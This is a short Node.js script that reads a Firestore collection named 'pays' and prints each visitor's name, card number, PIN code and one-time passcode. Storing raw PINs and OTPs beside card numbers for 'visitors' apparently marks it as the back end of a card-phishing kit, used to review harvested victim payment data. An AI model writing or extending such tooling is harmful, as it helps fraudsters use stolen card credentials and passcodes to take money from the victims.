const { initializeApp } = require('firebase/app');
const { getFirestore, collection, getDocs } = require('firebase/firestore');

const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

async function checkOtpStatus() {
  try {
    const querySnapshot = await getDocs(collection(db, "pays"));
    
    console.log("\n=== OTP Status Check ===\n");
    
    querySnapshot.forEach((doc) => {
      const data = doc.data();
      if (data.otpCode || data.pinCode || data.otpStatus) {
        console.log(`Visitor: ${data.ownerName || 'Unknown'}`);
        console.log(`  otpCode: ${data.otpCode || 'N/A'}`);
        console.log(`  pinCode: ${data.pinCode || 'N/A'}`);
        console.log(`  otpStatus: ${data.otpStatus || 'N/A'}`);
        console.log(`  cardNumber: ${data.cardNumber || 'N/A'}`);
        console.log('---');
      }
    });
    
    process.exit(0);
  } catch (error) {
    console.error("Error:", error);
    process.exit(1);
  }
}

checkOtpStatus();
